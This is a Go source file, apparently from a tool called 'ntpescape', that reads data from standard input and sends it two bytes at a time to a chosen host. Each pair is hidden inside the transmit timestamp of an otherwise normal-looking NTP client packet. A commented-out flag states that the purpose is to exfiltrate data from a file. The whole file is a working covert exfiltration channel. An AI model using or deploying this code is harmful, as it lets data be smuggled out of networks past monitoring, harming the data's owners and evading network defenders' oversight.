package send

import (
	"bufio"
	"encoding/binary"
	"errors"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"github.com/evallen/ntpescape/common"
	"os"
)

// Goal: Send an NTP packet to myself with the TX timestamp
// looking normal, but the final two bytes being 0a 0b
func Main() {
	host := flag.String("h", "localhost:123", "host: host to send the NTP packets to")
	// infile := flag.String("f", "-", "file: file to exfiltrate data from ('-' for STDIN)")
	flag.Parse()

	// assuming stdin
	inbuf := make([]byte, 1024)
	reader := bufio.NewReader(os.Stdin)

	for {
		n, err := reader.Read(inbuf)
		if err != nil {
			if err == io.EOF {
				break
			}
			log.Fatalf("Error reading STDIN: " + err.Error())
		}

		inbuf = inbuf[:n]

		for i := 0; i < len(inbuf); i += 2 {
			var message uint16
			if i == len(inbuf) - 1 {
				message = uint16(inbuf[i]) << 8
			} else {
				message = uint16(inbuf[i]) << 8 | uint16(inbuf[i+1])
			}
			sendMessage(message, host)
		}

		inbuf = inbuf[:cap(inbuf)]
	}
}

func sendMessage(message uint16, host *string) error {
	conn, err := net.Dial("udp", *host)
	if err != nil {
		msg := fmt.Sprintf("Failed to connect to %v: %v", *host, err)
		return errors.New(msg)
	}
	defer conn.Close()

	packet := common.GenerateClientPkt()
	packet.PatchPacket(message)

	if err := binary.Write(conn, binary.BigEndian, packet); err != nil {
		msg := fmt.Sprintf("Failed sending packet %v to %v: %v", packet, *host, err)
		return errors.New(msg)
	}

	return nil
}